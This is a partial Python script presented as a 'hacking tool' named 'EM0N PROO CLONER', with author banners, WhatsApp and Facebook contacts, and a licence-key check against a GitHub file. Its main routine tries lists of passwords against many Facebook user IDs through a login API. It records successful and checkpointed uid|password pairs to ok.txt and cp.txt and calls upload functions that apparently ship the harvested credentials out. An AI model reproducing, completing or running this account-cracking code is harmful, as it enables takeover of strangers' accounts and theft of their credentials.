...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/EM0N-0/Approvel/main/200%20Tool"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/mr.EM0N.502")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ WHATSAPP >> +8801308107598")
	subprocess.check_output(["am", "start", "https://m.me/mr.EM0N.502"])
 
def irfan():
	
	
	runtxt("\n\033[0;91m🧞‍This tool is offical for EM0N")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/EM0N-0/Mehedi/blob/main/KOH.txt').text
			if basesplit in plr:
				key = basesplit
...
\33[1;32mWelcome To Our Hacking Tools
 
\33[1;34m✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨
 
 
╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁     : 𝙼𝚎𝚑𝚎𝚍𝚒 𝙷𝚊𝚜𝚊𝚗 𝙴𝚖𝚘𝚗
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   : 𝙼𝚍 𝙼𝚒𝚣𝚊𝚗
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱     : 𝙴𝙼𝟶𝙽-𝟶
║\33[1;32m[↦] 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙   : +8801308107598
║\33[1;32m[↦] 𝚂𝚝𝚊𝚝𝚞𝚜     : 𝙵𝚛𝚎𝚎
║\33[1;32m[↦] 𝚃𝙴𝙰𝙼       : 𝙱𝙳 𝙲𝚢𝚋𝚎𝚛 𝚉𝚘𝚗𝚎-𝙱𝙲𝚉
║\33[1;32m[↦] 𝚅𝙴𝚁𝚂𝙸𝙾𝙽    : 1.0
╚════════════════════════════════════════╝
 
""")
		print("%s [%s•%s] %sTOOL NAME : %sEM0N❌ PROO CLONER❌"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
		print("%s [%s•%s] %s STATUS   : %sPREMIUM"%(G,R,G,B,G))
		print("")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [EM0N] : %s/%s -> \033[0;92m [ EM0N-OK:%s ]- \033[0;91m[EM0N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[EM0N-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [EM0N-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[EM0N-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [EM0N-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
